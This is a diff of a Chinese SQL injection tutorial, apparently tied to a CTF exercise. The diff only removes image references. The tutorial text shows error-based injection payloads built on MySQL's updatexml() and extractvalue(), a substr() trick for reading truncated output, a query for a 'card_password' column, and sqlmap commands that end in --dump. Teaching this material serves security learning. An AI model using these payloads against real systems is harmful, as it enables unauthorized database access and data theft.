@@ -28,11 +28,9 @@ SELECT * FROM users LIMIT 0,
 
 在MySQL中，`updatexml()`和`extractvalue()`是常用于报错注入的函数。它们用于操作XML文档。
 
-![](img/b30440e2332b8234e9944c46dc710728_3.png)
 
 `updatexml()`函数的作用是改变XML文档中符合条件的节点的值。它的第二个参数应该是一个XPath表达式（用于在XML中寻址）。如果我们提供的第二个参数不是一个合法的XPath，它就会报错。
 
-![](img/b30440e2332b8234e9944c46dc710728_5.png)
 
 我们可以利用这一点，将我们想要查询的`SELECT`语句结果，拼接成一个非法的XPath表达式。
 
@@ -44,7 +42,6 @@ AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)
 *   `(SELECT user())`是我们想要查询的内容。
 *   `concat()`函数将波浪线和查询结果拼接在一起。
 
-![](img/b30440e2332b8234e9944c46dc710728_7.png)
 
 执行后，数据库会因为XPath语法错误而报错，并在错误信息中输出拼接后的字符串，从而泄露`SELECT user()`的查询结果。
 
@@ -105,11 +102,9 @@ and extractvalue(1, concat(0x7e, (select card_password from teacher), 0x7e))
 ```
 执行后，可能会发现返回的错误信息被截断，无法显示完整的`flag`。
 
-![](img/b30440e2332b8234e9944c46dc710728_9.png)
 
 这是因为`extractvalue()`报错返回的信息长度有限制。解决方法是对查询结果进行截取，使用`substr()`函数分段获取。
 
-![](img/b30440e2332b8234e9944c46dc710728_11.png)
 
 例如，获取从第15个字符开始的内容：
 ```sql
@@ -119,9 +114,7 @@ and extractvalue(1, concat(0x7e, substr((select card_password from teacher), 15)
 
 ## 使用SQLMap自动化工具
 
-![](img/b30440e2332b8234e9944c46dc710728_13.png)
 
-![](img/b30440e2332b8234e9944c46dc710728_14.png)
 
 除了手动注入，我们还可以使用自动化工具`SQLMap`。基本命令如下：
 *   探测数据库：`sqlmap -u “目标URL” --dbs`
@@ -130,11 +123,8 @@ and extractvalue(1, concat(0x7e, substr((select card_password from teacher), 15)
 *   列出指定表的所有列：`sqlmap -u “目标URL” -D 数据库名 -T 表名 --columns`
 *   导出指定表的数据：`sqlmap -u “目标URL” -D 数据库名 -T 表名 --dump`
 
-![](img/b30440e2332b8234e9944c46dc710728_16.png)
 
-![](img/b30440e2332b8234e9944c46dc710728_18.png)
 
-![](img/b30440e2332b8234e9944c46dc710728_19.png)
 
 使用这些命令可以快速、自动地完成从信息收集到数据导出的全过程。
 
